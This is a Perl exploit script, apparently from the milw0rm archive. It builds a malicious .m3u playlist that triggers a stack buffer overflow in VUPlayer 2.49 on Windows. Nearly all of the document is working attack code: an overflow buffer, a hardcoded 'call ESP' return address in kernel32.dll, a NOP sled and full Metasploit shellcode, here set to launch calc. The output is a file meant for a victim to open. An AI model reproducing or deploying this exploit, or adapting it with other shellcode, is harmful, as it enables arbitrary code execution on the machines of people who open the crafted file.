#!/usr/bin/perl -w

# Author : Houssamix
# Download :  http://vuplayer.com/files/vuplayersetup.exe
# tested in windows pro Sp 2 (french)

# -- Viva Gazza -- Viva Palestine --

print "===================================================================== \n";
print "Author : Houssamix 						     \n";
print "===================================================================== \n";
print "VUPlayer v2.49 ( .wax file ) Local buffer overflow Exploit 	     \n";
print "file can be exploited :  (.wax)(.m3u)(.pls) 			     \n";	
print "===================================================================== \n\n";


my $overflow = "\x41" x 1012;
my $ret = "\x5D\x38\x82\x7C"; #call ESP from kernel32.dll       0x7C82385D
my $nop = "\x90" x 4;

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
my $shellcode =
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x08".
"\x99\x23\x82\x83\xeb\xfc\xe2\xf4\xf4\x71\x67\x82\x08\x99\xa8\xc7".
"\x34\x12\x5f\x87\x70\x98\xcc\x09\x47\x81\xa8\xdd\x28\x98\xc8\xcb".
"\x83\xad\xa8\x83\xe6\xa8\xe3\x1b\xa4\x1d\xe3\xf6\x0f\x58\xe9\x8f".
"\x09\x5b\xc8\x76\x33\xcd\x07\x86\x7d\x7c\xa8\xdd\x2c\x98\xc8\xe4".
"\x83\x95\x68\x09\x57\x85\x22\x69\x83\x85\xa8\x83\xe3\x10\x7f\xa6".
"\x0c\x5a\x12\x42\x6c\x12\x63\xb2\x8d\x59\x5b\x8e\x83\xd9\x2f\x09".
"\x78\x85\x8e\x09\x60\x91\xc8\x8b\x83\x19\x93\x82\x08\x99\xa8\xea".
"\x34\xc6\x12\x74\x68\xcf\xaa\x7a\x8b\x59\x58\xd2\x60\x69\xa9\x86".
"\x57\xf1\xbb\x7c\x82\x97\x74\x7d\xef\xfa\x42\xee\x6b\x99\x23\x82";


my $file="hsmx.m3u";

$exploit = $overflow.$ret.$nop.$shellcode;

open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $exploit ;


close($FILE);
print "$file has been created open it with vuplayer 2.49\n";

# milw0rm.com [2009-01-05]
